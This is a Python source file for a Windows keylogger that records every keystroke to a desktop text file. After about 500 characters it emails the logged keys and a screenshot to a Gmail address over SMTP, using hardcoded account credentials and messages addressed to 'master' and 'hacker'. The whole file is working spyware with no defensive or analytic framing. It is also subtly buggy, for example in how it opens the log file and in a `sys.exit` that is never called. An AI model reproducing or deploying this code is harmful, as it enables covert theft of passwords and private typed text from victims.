import pyHook,pythoncom,sys
import smtplib
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email import encoders
import getpass
import autopy

file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt','w+')
buffer = file_log.read()
file_log.close()
user = getpass.getuser()

def screenCapture():
    bitmap = autopy.bitmap.capture_screen()
    bitmap.save('C:\\Users\\wembl\\Desktop\\screenshot_of_'+ user+'.png')

def sendEmail(keyMessage):
    try:
        attachment = open('C:\\Users\\wembl\\Desktop\\screenshot_of_'+ user+'.png','rb')
        part = MIMEBase('application','octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition',"attachment;filename= "+file_log)
        fromaddr = 'keyhunter.hackspc@gmail.com'
        username = 'hackdemdead@gmail.com'
        password = 'leonardo19'
        keyMessage += "<br><br>" + "Keys have been logged master"
        msg = MIMEMultipart()
        msg.attach(part)
        msg.attach(MIMEText(keyMessage,'html'))
        msg['Subject'] = "Keys Logged From User: " + user
        msg['Reply-to'] = 'no-reply'
        msg['To'] = 'hackdemdead@gmail.com'
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(username, password)
        server.sendmail(fromaddr, ['hackdemdead@gmail.com'], msg.as_string())
        server.quit()

    except:
        print "Error sending email to hacker!!!"

    return True

def OnKeyboardEvent(event):
    file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt','r+')
    buffer = file_log.read()
    file_log.close()
    if len(buffer) > 500:
        sendEmail(buffer[-1000:].replace("\n", "<br>"))
        screenCapture()
        sys.exit

    file_log = open('C:\\Users\\wembl\\Desktop\\keys.txt',  'w')
    keylogs = chr(event.Ascii)
    # if user press ENTER
    if event.Ascii == 13:
        keylogs = '\n'
    # if user press space
    if event.Ascii == 32:
        keylogs = '  '
    buffer += keylogs
    file_log.write(buffer)
    file_log.close()
    return True

#Create hook manager project
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
#Set the hook
hooks_manager.HookKeyboard()
#Wait forever
pythoncom.PumpMessages()